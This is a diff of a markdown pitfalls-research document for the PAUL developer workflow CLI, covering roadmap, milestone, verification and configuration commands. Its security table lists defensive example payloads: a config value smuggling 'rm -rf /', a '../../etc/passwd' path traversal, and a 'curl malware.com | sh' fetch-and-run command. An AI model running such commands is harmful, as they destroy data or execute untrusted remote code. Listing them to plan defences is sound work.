@@ -1,12 +1,387 @@
 # Pitfalls Research
 
-**Domain:** Session management for development workflow tools
+**Domain:** Full PAUL command implementation (Session + Roadmap + Milestone + Pre-Planning + Research + Quality + Configuration)
 **Researched:** 2026-03-05
-**Confidence:** MEDIUM (web research + domain expertise, limited to session management patterns in dev tools)
+**Confidence:** MEDIUM (web research + domain expertise, CLI tool patterns, state management best practices)
+
+## Executive Summary
+
+This research documents pitfalls specific to implementing all 26 PAUL commands across 8 command categories. While the v1.0 baseline successfully implements the core loop (init, plan, apply, unify, progress, help) with robust atomic writes and state management, the remaining 20 commands introduce new complexity:
+
+**Most critical risks:**
+1. **State corruption** during roadmap mutations (add-phase/remove-phase) - can orphan plans, break dependencies, corrupt state files
+2. **Milestone synchronization** across multiple phases - easy to drift, hard to detect
+3. **Pre-planning state bloat** - discuss, assumptions, discover generate large research files without cleanup
+4. **Configuration conflicts** - multiple config sources (flows, config, map-codebase) create ambiguity
+
+**Infrastructure already in place:**
+- Atomic file writes prevent data loss (atomic-writes.ts)
+- Zod validation catches schema errors early
+- Per-phase state files isolate damage
+- Loop enforcer prevents invalid transitions
+
+**Gaps to address:**
+- No dependency graph management for roadmap mutations
+- No milestone tracking across phases
+- No cleanup strategy for research artifacts
+- No configuration hierarchy or merge strategy
+- No verification state persistence
 
 ## Critical Pitfalls
 
-### Pitfall 1: Serialization Blind Spots
+### Pitfall 1: Phase Number Collisions During add-phase
+
+**What goes wrong:**
+User adds a phase with number 5 when phase 5 already exists. Or add-phase increments incorrectly, creating gaps (1, 2, 5, 6) or duplicates (1, 2, 2, 3). Plans and state files become unlinked, roadmap references wrong phases, progress shows missing phases.
+
+**Why it happens:**
+- add-phase doesn't check existing phase numbers
+- Assumes "next available number" is always max + 1
+- Multiple concurrent add-phase operations
+- Manual editing of ROADMAP.md not reflected in state
+- No validation that phase numbers are unique and sequential
+
+**How to avoid:**
+1. **Read all phase state files** before adding - not just latest
+2. **Validate phase uniqueness** - throw if phase number exists
+3. **Offer two modes**: append (max+1) or insert (renumber subsequent)
+4. **Atomic phase addition** - write ROADMAP.md + state file + renumber in transaction
+5. **Renumber helper** - if inserting, update all phase references atomically
+6. **Gap detection** - warn if gaps exist in phase numbering
+
+**Warning signs:**
+- Multiple `state-phase-5.json` files
+- Phase numbers in ROADMAP.md don't match state files
+- "Phase not found" errors when referencing phases
+- Gaps in phase sequence (1, 2, 5, 6)
+- Progress command skips phases or shows duplicates
+
+**Phase to address:**
+add-phase implementation - BEFORE exposing to users
+
+---
+
+### Pitfall 2: Orphaned Plans and State During remove-phase
+
+**What goes wrong:**
+Removing phase 3 leaves orphaned plans (3-01-PLAN.json, 3-02-PLAN.json) and state files. State files reference removed phase in dependencies. User can't complete later phases because they depend on removed phase.
+
+**Why it happens:**
+- remove-phase only deletes phase entry from ROADMAP.md
+- Doesn't scan for dependent phases (phase 4 depends on phase 3)
+- Doesn't clean up plan files in `.paul/phases/`
+- Doesn't delete `state-phase-N.json`
+- No validation that removal is safe
+
+**How to avoid:**
+1. **Dependency graph traversal** - check all phases that depend on target
+2. **Cascade delete with confirmation** - "Removing phase 3 will also remove phases 4, 5. Continue? (y/N)"
+3. **Orphan detection** - list what will be deleted before confirmation
+4. **Atomic cleanup** - delete ROADMAP.md entry, state file, ALL plan files in transaction
+5. **Safe mode default** - require explicit `--force` if dependencies exist
+6. **Post-removal validation** - verify no dangling references
+
+**Warning signs:**
+- Plan files in `.paul/phases/` for non-existent phases
+- State files for removed phases still exist
+- Progress command shows "Phase not found"
+- ROADMAP.md has gaps or references to missing phases
+- `/paul:plan` fails for phases that don't exist
+
+**Phase to address:**
+remove-phase implementation - requires dependency graph first
+
+---
+
+### Pitfall 3: Phase Dependency Chain Corruption
+
+**What goes wrong:**
+add-phase or remove-phase breaks the dependency chain defined in ROADMAP.md. Phase 4 depends on phase 3, but remove-phase deletes 3 without updating 4's dependencies. Or add-phase inserts phase 2.5 but doesn't update phase 3's dependencies to point to 2.5 instead of 2.
+
+**Why it happens:**
+- No dependency graph data structure
+- ROADMAP.md is human-readable but not machine-validated
+- Dependencies stored as strings, not references
+- No cascade updates when graph changes
+- Manual edits to ROADMAP.md bypass validation
+
+**How to avoid:**
+1. **Parse ROADMAP.md into dependency graph** on load
+2. **Validate graph integrity** - no cycles, all nodes exist
+3. **On remove-phase**: update dependents' parents
+4. **On add-phase**: offer to link to existing phases
+5. **Graph validation command** - `/paul:verify-graph` (add to roadmap commands)
+6. **Immutable references** - use phase IDs, not numbers (though numbers are more user-friendly)
+
+**Warning signs:**
+- Circular dependencies in ROADMAP.md
+- Phase dependencies reference non-existent phases
+- add-phase succeeds but roadmap is now inconsistent
+- remove-phase succeeds but later phases can't complete
+- Progress command shows dependency errors
+
+**Phase to address:**
+Both add-phase and remove-phase - need dependency graph first
+
+---
+
+### Pitfall 4: Milestone State Desynchronization
+
+**What goes wrong:**
+Milestone marked as "complete" in `.paul/milestones.json` but referenced phases still incomplete. Or milestone shows 50% progress but all phases report 100%. Milestone data doesn't match actual phase state.
+
+**Why it happens:**
+- Milestone state stored separately from phase state
+- No automatic recalculation when phases change
+- Manual milestone edits override calculated state
+- Milestone completion criteria not validated against phase completion
+- No event-driven updates (phase completes → milestone updates)
+
+**How to avoid:**
+1. **Calculate milestone progress dynamically** - don't store as mutable state
+2. **Milestone as view, not state** - derive from phase files
+3. **Complete-milestone validates** - check all phases are done
+4. **Discuss-milestone shows live data** - always read current phase state
+5. **Milestone completion criteria** - explicit validation rules
+6. **Milestone lock** - once complete, prevent phase modifications (or warn)
+
+**Warning signs:**
+- Milestone progress doesn't sum to phase progress
+- Milestone marked complete but phases show incomplete
+- Progress command shows inconsistent milestone vs. phase data
+- Manual edits to milestone file break state
+- /paul:complete-milestone succeeds but phases aren't done
+
+**Phase to address:**
+All three milestone commands - design milestone as computed view, not stored state
+
+---
+
+### Pitfall 5: Multiple Active Milestones
+
+**What goes wrong:**
+User creates milestones for v1.1, v1.2, v2.0 all simultaneously. All marked as "active". No way to tell which is current work. Progress shows all milestones, user confused about priorities.
+
+**Why it happens:**
+- No "current milestone" concept
+- Milestones don't have status (planned, active, complete, deferred)
+- No milestone ordering or sequencing
+- Multiple milestones can reference same phases
+- No validation that only one milestone should be active
+
+**How to avoid:**
+1. **Milestone status enum** - planned, active, complete, deferred, cancelled
+2. **Single active milestone constraint** - validate on milestone creation
+3. **Milestone dependencies** - v2.0 depends on v1.1 being complete
+4. **Current milestone pointer** - in state or derived from status
+5. **Milestone activation command** - `/paul:milestone --activate`
+6. **Milestone retirement** - auto-complete or defer old milestones
+
+**Warning signs:**
+- Multiple milestones show "active" in progress
+- User asks "which milestone am I working on?"
+- Phases assigned to multiple active milestones
+- Milestone completion criteria overlap or conflict
+- Progress command shows confusing milestone list
+
+**Phase to address:**
+milestone and complete-milestone commands - enforce single active milestone
+
+---
+
+### Pitfall 6: Pre-Planning Artifacts Accumulate Without Cleanup
+
+**What goes wrong:**
+`/paul:discuss`, `/paul:assumptions`, `/paul:discover`, `/paul:consider-issues` create research files (`.paul/research/`, `.paul/assumptions/`, etc.) that grow indefinitely. No cleanup strategy. Storage bloats. Hard to find current research among dozens of old files.
+
+**Why it happens:**
+- Commands only create, never delete
+- No "archived" status for old research
+- No size limits or retention policy
+- User assumes "PAUL will handle cleanup"
+- Research files aren't tied to phase completion
+
+**How to avoid:**
+1. **Research retention policy** - auto-archive after phase completes
+2. **Per-phase research directories** - easy to bulk-delete with phase
+3. **Archive command** - `/paul:research --archive-phase 1`
+4. **Size warnings** - warn if research > 10MB per phase
+5. **Link research to phase** - delete research when phase removed
+6. **Current research pointer** - one "active" research file per phase
+
+**Warning signs:**
+- `.paul/research/` has hundreds of files
+- Disk usage by `.paul/` grows without bound
+- User asks "which research is current?"
+- Research files for completed phases still in active directory
+- Git ignores `.paul/` but it's still bloated
+
+**Phase to address:**
+All four pre-planning commands - design with cleanup from day 1
+
+---
+
+### Pitfall 7: Research Redundancy and Duplication
+
+**What goes wrong:**
+`/paul:discover` and `/paul:assumptions` capture the same information twice. `/paul:discuss` generates notes that duplicate what's in `assumptions.md`. Users don't know which file is authoritative. Contradictory information across files.
+
+**Why it happens:**
+- No clear boundary between commands
+- Commands have overlapping capture forms
+- No "source of truth" concept
+- Users run all four commands "just to be safe"
+- No deduplication or merging strategy
+
+**How to avoid:**
+1. **Clear command boundaries** - document what each command captures
+2. **Command interaction rules** - "assumptions before discover", etc.
+3. **Deduplication on write** - check if captured before adding
+4. **Merge command** - `/paul:research --merge` to combine artifacts
+5. **Authoritative source tagging** - mark which file is primary
+6. **Cross-reference** - link related files (assumptions → discuss)
+
+**Warning signs:**
+- Same assumption in assumptions.md AND discover.md
+- User asks "should I run all four commands?"
+- Research files contradict each other
+- Discuss notes duplicate assumptions
+- No clear entry point for reading research
+
+**Phase to address:**
+All four pre-planning commands - design with clear boundaries and deduplication
+
+---
+
+### Pitfall 8: Verification State Not Persisted
+
+**What goes wrong:**
+`/paul:verify` runs tests and checks but doesn't save results. User runs verify, sees all tests pass, but later there's no record. Next verify has to re-run everything. Can't track historical verification results or trends.
+
+**Why it happens:**
+- Verify command prints to stdout only
+- No verification result schema or storage
+- "Stateless" approach seems simpler initially
+- No verification history needed for core loop
+- Didn't anticipate need for verification tracking
+
+**How to avoid:**
+1. **Verification result schema** - timestamp, tests passed/failed, issues found
+2. **Save to `.paul/verification.json`** - per-phase verification history
+3. **Trend tracking** - show "tests passed: 45/50 (was 40/50 yesterday)"
+4. **Verification snapshots** - quick re-run of last verification
+5. **Verification lock** - prevent plan apply if verification failed
+6. **Verification summary** - show recent history in progress command
+
+**Warning signs:**
+- User asks "when did tests last pass?"
+- Verify has to re-run everything every time
+- No record of which tests failed historically
+- Can't tell if verification is improving or regressing
+- No evidence to show code reviewer that tests pass
+
+**Phase to address:**
+verify command - design with persistence from day 1
+
+---
+
+### Pitfall 9: plan-fix Creates Infinite Loop
+
+**What goes wrong:**
+`/paul:plan-fix` generates a new plan to fix verification failures. User runs plan, verify still fails. Runs plan-fix again, generates another plan. Infinite loop of plan → apply → verify → fail → plan-fix.
+
+**Why it happens:**
+- plan-fix doesn't analyze root cause
+- Generates superficial fixes
+- Doesn't learn from previous failures
+- No limit on retry attempts
+- plan-fix can generate same failing plan twice
+
+**How to avoid:**
+1. **Root cause analysis** - analyze verification failures before generating plan
+2. **Fix idempotency check** - don't generate plan if already attempted
+3. **Retry limit** - fail after 3 plan-fix attempts with same error
+4. **plan-fix history** - track previous attempts, avoid repetition
+5. **Human intervention checkpoint** - "Manual review required after 2 failed attempts"
+6. **Diagnostic output** - show WHY verification failed, not just THAT it failed
+
+**Warning signs:**
+- User runs plan-fix more than 3 times in a row
+- Verification fails with same error repeatedly
+- Generated plans look similar or identical
+- User says "plan-fix isn't helping"
+- Infinite loop in plan → apply → verify cycle
+
+**Phase to address:**
+plan-fix command - design with analysis, history, and limits
+
+---
+
+### Pitfall 10: Configuration Hierarchy Ambiguity
+
+**What goes wrong:**
+`/paul:config`, `/paul:flows`, `/paul:map-codebase` all modify configuration. User doesn't know which command takes precedence. Config set by `/paul:config` is overridden by `/paul:flows`. No clear hierarchy. Confusion about "which config is active?"
+
+**Why it happens:**
+- Three separate config commands without clear separation
+- No configuration merging strategy
+- Config sources not documented as hierarchy
+- Commands overwrite instead of merge
+- No "show effective config" command
+
+**How to avoid:**
+1. **Clear config hierarchy** - document precedence: defaults < config < flows < map-codebase
+2. **Merged configuration view** - `/paul:config --show-effective`
+3. **Config schema validation** - ensure configs are compatible
+4. **Override warnings** - "flows config overrides config setting X"
+5. **Config isolation** - each command manages distinct config section
+6. **Config lock** - prevent contradictory settings across commands
+
+**Warning signs:**
+- User asks "which config is actually being used?"
+- Setting X in config has no effect (overridden)
+- Two commands set same key, unclear which wins
+- No way to see merged/active configuration
+- Surprise behavior due to unexpected config overrides
+
+**Phase to address:**
+All three configuration commands - design hierarchy and merging before implementation
+
+---
+
+### Pitfall 11: map-codebase Performance Degradation
+
+**What goes wrong:**
+`/paul:map-codebase` scans entire project directory, reads all files, builds AST or index. On large projects (10k+ files), this takes minutes. Command feels stuck. User kills it. Partial maps are left behind.
+
+**Why it happens:**
+- No incremental mapping - rescans everything every time
+- No file filtering - maps `.git/`, `node_modules/`, etc.
+- No progress feedback - user thinks command hung
+- No caching - can't reuse previous maps
+- No size limits - runs forever on massive codebases
+
+**How to avoid:**
+1. **Exclude patterns** - `.gitignore`, `node_modules/`, `.paul/` auto-excluded
+2. **Incremental mapping** - only scan changed files since last map
+3. **Progress indicator** - "Scanning file 1000/5000..."
+4. **Cache maps** - store `.paul/codebase-map.json`, reuse if unchanged
+5. **Size limits** - fail gracefully if > 50k files or 1GB codebase
+6. **Timeout** - abort after 5 minutes with "codebase too large, try incremental mode"
+
+**Warning signs:**
+- `/paul:map-codebase` takes > 30 seconds
+- Command appears hung with no output
+- Map files are 100MB+ (too large)
+- User complains "map-codebase is slow"
+- Partial maps left in `.paul/` after command killed
+
+**Phase to address:**
+map-codebase command - design with incremental mapping and size limits
+
+---
+
+### Pitfall 12: Serialization Blind Spots (Existing - from v1.0 research)
 
 **What goes wrong:**
 Session state fails to serialize/deserialize correctly because non-serializable objects (functions, circular references, class instances without serialization support) are stored in state. Session appears to save but crashes on resume or loses critical context.
@@ -38,7 +413,7 @@ Pause command implementation - validate serialization BEFORE building resume
 
 ---
 
-### Pitfall 2: Orphaned Session Files
+### Pitfall 13: Orphaned Session Files (Existing - from v1.0 research)
 
 **What goes wrong:**
 Multiple paused session files accumulate without cleanup. Users can't tell which is current, resume picks wrong session, or storage bloats with abandoned sessions. Context becomes fragmented across multiple "paused" states.
@@ -70,7 +445,7 @@ Both pause AND resume - pause creates correctly, resume cleans up
 
 ---
 
-### Pitfall 3: Incomplete Context Capture
+### Pitfall 14: Incomplete Context Capture (Existing - from v1.0 research)
 
 **What goes wrong:**
 Paused session lacks critical context needed to resume effectively. Key decisions, mental state, "what I was about to do", file modifications, or dependencies are missing. Resume feels like "starting over" despite pause.
@@ -102,7 +477,7 @@ Pause command - this is WHERE context is captured
 
 ---
 
-### Pitfall 4: Handoff Document Drift
+### Pitfall 15: Handoff Document Drift (Existing - from v1.0 research)
 
 **What goes wrong:**
 Handoff documents become stale, incomplete, or disconnected from actual project state. New developers receive outdated context, wrong phase information, or missing critical decisions. Handoff creates MORE confusion instead of less.
@@ -134,7 +509,7 @@ Handoff command - separate from pause, focused on external sharing
 
 ---
 
-### Pitfall 5: Deprecation Without Migration Path
+### Pitfall 16: Deprecation Without Migration Path (Existing - from v1.0 research)
 
 **What goes wrong:**
 `/paul:status` is deprecated but users still have:
@@ -172,7 +547,7 @@ Status deprecation - make it a GOOD deprecation, not just removal
 
 ---
 
-### Pitfall 6: State Version Mismatch
+### Pitfall 17: State Version Mismatch (Existing - from v1.0 research)
 
 **What goes wrong:**
 Session paused with v1.0 state format, but resumed with v1.1 code that expects different schema. Resume fails, corrupts data, or silently loses information. Version compatibility not handled.
@@ -204,7 +579,7 @@ Both pause and resume - pause writes version, resume checks it
 
 ---
 
-### Pitfall 7: Race Conditions in State Updates
+### Pitfall 18: Race Conditions in State Updates (Existing - from v1.0 research)
 
 **What goes wrong:**
 Two processes attempt to update session state simultaneously:
@@ -253,10 +628,16 @@ Shortcuts that seem reasonable but create long-term problems.
 | Single giant session file | Simpler file management | Hard to debug, slow to load, risky updates | Only for <10KB state |
 | No cleanup of old sessions | Avoid "delete user data" risk | Storage bloat, confusion about current session | Never - auto-cleanup with confirmation |
 | Generate handoff manually | Flexible, can add context | Drifts from actual state, inconsistent format | Never - always generate from state |
+| Phase numbers as strings | Simpler parsing | Can't do math, easy to have duplicates | Never - use numbers, pad to string only for display |
+| Milestone as mutable state | Simple read/write | Desyncs with actual phase completion | Never - compute from phases, don't store |
+| No dependency graph | Simpler ROADMAP.md | Impossible to validate mutations, cascading errors | Only for <5 phases |
+| Research files without cleanup | Don't lose any work | Storage bloat, can't find current info | Never - archive with phase completion |
+| Config overwrites instead of merges | Simpler implementation | User confusion, unexpected overrides | Never - design hierarchy first |
+| map-codebase scans everything | Guaranteed complete map | Takes forever on large codebases | Never - incremental from day 1 |
 
 ## Integration Gotchas
 
-Common mistakes when connecting session management to existing OpenPAUL state.
+Common mistakes when connecting to existing OpenPAUL state.
 
 | Integration Point | Common Mistake | Correct Approach |
 |-------------------|----------------|------------------|
@@ -266,6 +647,13 @@ Common mistakes when connecting session management to existing OpenPAUL state.
 | **State Manager** | Bypass for session commands | Extend StateManager, maintain single source of truth |
 | **Loop Phase** | Ignore current loop position | Include loop phase in session context, validate on resume |
 | **Metadata Field** | Ignore existing metadata | Preserve and extend, don't replace |
+| **ROADMAP.md** | Parse as text, assume format | Parse into dependency graph, validate structure |
+| **Milestone Data** | Store as separate JSON | Compute from phase state, don't duplicate |
+| **Research Files** | Create in root `.paul/` | Create per-phase subdirectories for cleanup |
+| **Verification Results** | Print to stdout only | Save to `.paul/verification.json` for history |
+| **plan-fix Plans** | Treat as regular plans | Mark as fix attempt, track history to prevent loops |
+| **Config Commands** | All write to same file | Design hierarchy: defaults < config < flows < map-codebase |
+| **map-codebase Cache** | No caching strategy | Incremental updates, timestamp-based invalidation |
 
 ## Performance Traps
 
@@ -278,10 +666,17 @@ Patterns that work at small scale but fail as usage grows.
 | **Full state serialization** | Pause takes >500ms | Incremental updates, diff-based serialization | State >1MB |
 | **No lazy loading** | Resume loads entire history | Load recent first, lazy-load older context | >50 plans/phase |
 | **Unbounded history** | `.paul/` grows without limit | Age-based cleanup, archive old sessions | >1GB total storage |
+| **map-codebase full scan** | Takes minutes, appears hung | Incremental mapping, exclude patterns, caching | >10k files or >100MB codebase |
+| **Research file bloat** | `.paul/research/` huge, slow searches | Archive with phase completion, per-phase directories | >1GB research artifacts |
+| **No verification caching** | Reruns all tests every time | Cache test results, rerun only changed | Test suite >5 minutes |
+| **Dependency graph recalc** | Slow roadmap operations, add/remove sluggish | Cache graph, invalidate on changes | >20 phases |
+| **Milestone full recalc** | Progress command slow, especially with many phases | Cache progress, update on phase completion | >50 phases |
+| **Config merge on every read** | Config reads slow | Merge once at startup, cache result | Many config reads per command |
+| **No file watching** | Manual trigger of map-codebase | Watch for file changes, auto-incremental map | Frequent codebase changes |
 
 ## Security Mistakes
 
-Session management specific security issues.
+Domain-specific security issues beyond general web security.
 
 | Mistake | Risk | Prevention |
 |---------|------|------------|
@@ -290,10 +685,17 @@ Session management specific security issues.
 | **Session tampering** | Modified session files inject malicious context | Checksums or signatures on session files |
 | **Sensitive data in sessions** | API keys, tokens captured in paused state | Sanitize before persist, never store secrets |
 | **Session file permissions** | World-readable session files | Set restrictive permissions (0600) on creation |
+| **Milestone spoofing** | User marks milestone complete without validation | Validate against phase state, require admin or phase completion |
+| **Codebase map exposes internal structure** | Attackers learn project layout | Add `.gitignore` filtering, respect access controls |
+| **Assumptions files in VC** | Expose business logic, security assumptions | Add `assumptions.md` to `.gitignore` or document as public |
+| **plan-fix injection** | Malicious user injects code via plan-fix | Validate plan-fix output, sandbox execution |
+| **Config command injection** | `config --set "KEY=VALUE; rm -rf /"` | Parse config values strictly, no shell execution |
+| **Research file path traversal** | `research --output ../../etc/passwd` | Validate and sandbox output paths |
+| **Verification command injection** | `verify --cmd "curl malware.com \| sh"` | Whitelist allowed verification commands, no arbitrary execution |
 
 ## UX Pitfalls
 
-Common user experience mistakes in session management.
+Common user experience mistakes in command design.
 
 | Pitfall | User Impact | Better Approach |
 |---------|-------------|-----------------|
@@ -303,17 +705,76 @@ Common user experience mistakes in session management.
 | **Handoff with no preview** | User afraid to share incomplete/wrong info | Preview handoff, allow edits before finalizing |
 | **Deprecation with no guidance** | User frustrated, doesn't know what to do | Show exact replacement command and why it's better |
 | **Session with no timestamp** | User doesn't know how old context is | Always show age: "This session is 3 days old" |
+| **add-phase without preview** | User doesn't know what will change | Show dry-run: "Adding phase 5. Will create: state-phase-5.json, update ROADMAP.md" |
+| **remove-phase without confirmation** | Accidentally deletes critical phase | Require confirmation, show what will be deleted |
+| **Milestone progress without context** | "50% complete" but what does that mean? | Show breakdown: "2/4 phases complete. Remaining: Phase 3 (API), Phase 4 (UI)" |
+| **Research command output too verbose** | Can't find the insights | Structured sections with clear headings, summary at top |
+| **verify command shows no history** | Can't tell if improving or regressing | Show trend: "Tests: 45/50 (was 40/50 yesterday, +5)" |
+| **plan-fix generates generic plan** | Plan doesn't actually fix the issue | Root cause analysis first, targeted fixes |
+| **config command shows merged view only** | User confused about which source set what | Show config sources: "X=10 (from config), Y=20 (from flows)" |
+| **map-codebase hangs without progress** | User thinks command crashed, kills it | Progress bar: "Scanning file 1000/5000..." |
+| **Multiple milestones, all "active"** | User doesn't know what to work on | Single active milestone, show "Current work" section clearly |
 
 ## "Looks Done But Isn't" Checklist
 
 Things that appear complete but are missing critical pieces.
 
+**Session Management (Already in v1.0 research)**
 - [ ] **Pause command:** Often missing validation that session is usable — verify round-trip test (pause → resume in test)
 - [ ] **Resume command:** Often missing conflict detection (what if state changed since pause?) — verify state comparison
 - [ ] **Handoff document:** Often missing verification against actual project state — verify handoff matches ROADMAP.md phase
 - [ ] **Status deprecation:** Often missing migration guide — verify docs updated AND deprecation message helpful
 - [ ] **Session storage:** Often missing cleanup strategy — verify old sessions handled correctly
 - [ ] **Version compatibility:** Often missing version field — verify sessions have schema version
+
+**Roadmap Management**
+- [ ] **add-phase:** Often missing dependency graph update — verify depends_on updated for subsequent phases
+- [ ] **add-phase:** Often missing phase number validation — verify no duplicate phase numbers
+- [ ] **add-phase:** Often missing ROADMAP.md update — verify both state file and ROADMAP.md written atomically
+- [ ] **remove-phase:** Often missing cascade delete — verify dependent phases removed or updated
+- [ ] **remove-phase:** Often missing orphan cleanup — verify plan files and state files deleted
+- [ ] **Both:** Often missing dependency graph — verify graph exists before implementing
+
+**Milestone Management**
+- [ ] **milestone:** Often missing single active milestone constraint — verify can't have multiple active milestones
+- [ ] **complete-milestone:** Often missing phase completion validation — verify all phases done before marking complete
+- [ ] **discuss-milestone:** Often missing live data — verify shows current phase state, not cached
+- [ ] **All:** Often missing milestone schema — verify milestone fields defined and validated
+- [ ] **All:** Often missing milestone-roadmap sync — verify milestone progress computed from phases
+
+**Pre-Planning**
+- [ ] **discuss:** Often missing structured capture format — verify output has sections (context, decisions, blockers)
+- [ ] **assumptions:** Often missing validation — verify assumptions are testable or flagged as untestable
+- [ ] **discover:** Often missing deduplication — verify doesn't add already-discovered items
+- [ ] **consider-issues:** Often missing issue tracking — verify issues have IDs, status, priority
+- [ ] **All four:** Often missing cleanup strategy — verify research files archived/deleted with phase
+- [ ] **All four:** Often missing cross-referencing — verify research files link to each other
+
+**Research**
+- [ ] **research:** Often missing output format definition — verify research result schema
+- [ ] **research:** Often missing link to phase — verify research stored in per-phase directory
+- [ ] **research-phase:** Often missing scope definition — verify what files/components are researched
+- [ ] **Both:** Often missing artifact naming — verify consistent naming scheme (research-topic-DATE.md)
+- [ ] **Both:** Often missing archive strategy — verify old research doesn't bloat storage
+
+**Quality**
+- [ ] **verify:** Often missing result persistence — verify results saved to `.paul/verification.json`
+- [ ] **verify:** Often missing trend tracking — verify shows history, not just current run
+- [ ] **verify:** Often missing verification schema — verify what constitutes a "pass"
+- [ ] **plan-fix:** Often missing root cause analysis — verify analyzes failures before generating plan
+- [ ] **plan-fix:** Often missing idempotency check — verify doesn't generate same plan twice
+- [ ] **plan-fix:** Often missing retry limit — verify fails after N attempts with guidance
+
+**Configuration**
+- [ ] **config:** Often missing schema validation — verify config values match expected types/ranges
+- [ ] **config:** Often missing merge strategy — verify how config interacts with flows/map-codebase
+- [ ] **flows:** Often missing flow definition schema — verify what a "flow" is
+- [ ] **flows:** Often missing conflict resolution — verify what happens when flows override config
+- [ ] **map-codebase:** Often missing incremental mapping — verify only scans changed files
+- [ ] **map-codebase:** Often missing progress feedback — verify shows scan progress
+- [ ] **map-codebase:** Often missing size limits — verify fails gracefully on large codebases
+- [ ] **All three:** Often missing hierarchy documentation — verify precedence documented and enforced
+- [ ] **All three:** Often missing "show effective config" — verify user can see merged/active config
 
 ## Recovery Strategies
 
@@ -328,11 +789,24 @@ When pitfalls occur despite prevention, how to recover.
 | **Handoff drift** | LOW | Regenerate from current state. Old handoff already sent - send correction. |
 | **State race condition** | HIGH | Restore from backup/git, implement locking to prevent recurrence |
 | **Missing version field** | HIGH | Add version field, assume v1 for unversioned files, test extensively |
+| **Phase number collision** | MEDIUM | Manually renumber phases, update all references in ROADMAP.md and state files |
+| **Orphaned plans after remove-phase** | MEDIUM | Manually delete plan files, update state dependencies |
+| **Broken dependency chain** | HIGH | Manually repair ROADMAP.md dependencies, validate with graph traversal |
+| **Milestone desync** | LOW | Delete milestone file, recalculate from phase state |
+| **Multiple active milestones** | LOW | Manually set one to "active", others to "planned" |
+| **Research bloat** | LOW | Manually archive old research files, add cleanup to future phases |
+| **Research duplication** | MEDIUM | Manually merge duplicate files, add deduplication to commands |
+| **Missing verification history** | LOW | Can't recover history - start tracking from now |
+| **plan-fix infinite loop** | MEDIUM | Manually break loop, analyze root cause, fix manually |
+| **Config hierarchy confusion** | LOW | Manually determine effective config, document hierarchy |
+| **map-codebase performance** | MEDIUM | Implement incremental mapping, clear cache, rescan |
+| **Missing dependency graph** | HIGH | Parse ROADMAP.md, validate structure, implement graph |
 
 ## Pitfall-to-Phase Mapping
 
 How roadmap phases should address these pitfalls.
 
+**Session Management (Already in v1.0 research)**
 | Pitfall | Prevention Phase | Verification |
 |---------|------------------|--------------|
 | Serialization Blind Spots | Pause command implementation | Test: pause with complex state, resume in fresh process, verify all data |
@@ -343,16 +817,91 @@ How roadmap phases should address these pitfalls.
 | State Version Mismatch | Both pause AND resume | Test: create v1 session file manually, resume with v2 code, verify migration |
 | Race Conditions | State manager enhancement | Test: two concurrent pause operations, verify atomic handling |
 
+**Roadmap Management**
+| Pitfall | Prevention Phase | Verification |
+|---------|------------------|--------------|
+| Phase Number Collisions | add-phase implementation | Test: add phase 5 when 5 exists, verify error |
+| Orphaned Plans/State | remove-phase implementation | Test: remove phase 3, verify plan files deleted |
+| Dependency Chain Corruption | Both add/remove + dependency graph | Test: remove phase 3, verify phase 4 dependencies updated |
+| Missing Dependency Graph | Infrastructure BEFORE roadmap commands | Test: parse ROADMAP.md, validate graph structure |
+
+**Milestone Management**
+| Pitfall | Prevention Phase | Verification |
+|---------|------------------|--------------|
+| Milestone State Desync | All milestone commands | Test: complete phase, verify milestone progress updates |
+| Multiple Active Milestones | milestone command | Test: create second active milestone, verify error |
+
+**Pre-Planning**
+| Pitfall | Prevention Phase | Verification |
+|---------|------------------|--------------|
+| Research Artifacts Accumulate | All four pre-planning commands | Test: complete phase, verify research archived |
+| Research Redundancy | All four pre-planning commands | Test: run discuss and assumptions, verify no duplicates |
+
+**Research**
+| Pitfall | Prevention Phase | Verification |
+|---------|------------------|--------------|
+| None unique to research | N/A | Pre-planning cleanup covers research artifacts |
+
+**Quality**
+| Pitfall | Prevention Phase | Verification |
+|---------|------------------|--------------|
+| Verification State Not Persisted | verify command | Test: run verify, check `.paul/verification.json` exists |
+| plan-fix Infinite Loop | plan-fix command | Test: trigger plan-fix 3 times, verify stops with guidance |
+
+**Configuration**
+| Pitfall | Prevention Phase | Verification |
+|---------|------------------|--------------|
+| Configuration Hierarchy Ambiguity | All three config commands | Test: set X in config, set X in flows, verify which wins |
+| map-codebase Performance | map-codebase command | Test: run on 10k files, verify < 30 seconds with progress |
+
 ## Sources
 
+**Session Management (from v1.0 research):**
 - **Session serialization issues:** Web search results on session state serialization problems (ASP.NET, JavaEE patterns) - MEDIUM confidence (general patterns, not dev-tool specific)
 - **Workflow handoff mistakes:** Focus & Stack workflow management guide, NimbleWork task handoff article - MEDIUM confidence (project management focused, but patterns apply)
 - **State migration:** PlanetScale backward-compatible database changes, Airbyte connector breaking changes docs - HIGH confidence (authoritative sources on state evolution)
 - **Deprecation patterns:** React 19 migration guide, common upgrade mistake analysis - HIGH confidence (real-world deprecation experience)
 - **Domain expertise:** Personal knowledge of session management in CLI tools, state serialization patterns, developer workflow tools - Used to synthesize and extend web findings
 
+**Roadmap & Dependency Management:**
+- **Dependency graph patterns:** Graph theory basics, DAG validation algorithms - HIGH confidence (computer science fundamentals)
+- **Cascading deletes:** Database foreign key constraints, Git branch deletion - HIGH confidence (well-established patterns)
+- **Phase numbering systems:** Semantic versioning, project phase numbering conventions - MEDIUM confidence (industry practices)
+- **Domain expertise:** Personal experience with project roadmap tools, dependency management, phase-based development - Synthesized from experience
+
+**Milestone Management:**
+- **Computed state vs. stored state:** React computed properties, database views vs. materialized views - HIGH confidence (fundamental concept)
+- **Milestone tracking patterns:** Agile milestone practices, JIRA milestone features - MEDIUM confidence (project management tools)
+- **Domain expertise:** Personal experience with milestone tracking in software projects - Synthesized from experience
+
+**Pre-Planning & Research:**
+- **Artifact retention policies:** Data retention best practices, log rotation - MEDIUM confidence (general IT practices)
+- **Deduplication strategies:** Database deduplication, duplicate detection algorithms - MEDIUM confidence (general patterns)
+- **Domain expertise:** Personal experience with research artifacts, knowledge management, developer documentation - Synthesized from experience
+
+**Quality & Verification:**
+- **Test result persistence:** CI/CD result storage, test history tracking - MEDIUM confidence (DevOps patterns)
+- **Root cause analysis:** Debugging methodologies, failure analysis - MEDIUM confidence (general software engineering)
+- **Fix idempotency:** Idempotent operations patterns, retry logic - HIGH confidence (distributed systems concepts)
+- **Domain expertise:** Personal experience with verification systems, automated testing, bug fixing workflows - Synthesized from experience
+
+**Configuration Management:**
+- **Configuration hierarchies:** .dockerconfig precedence, environment variable vs. file config - MEDIUM confidence (well-established patterns)
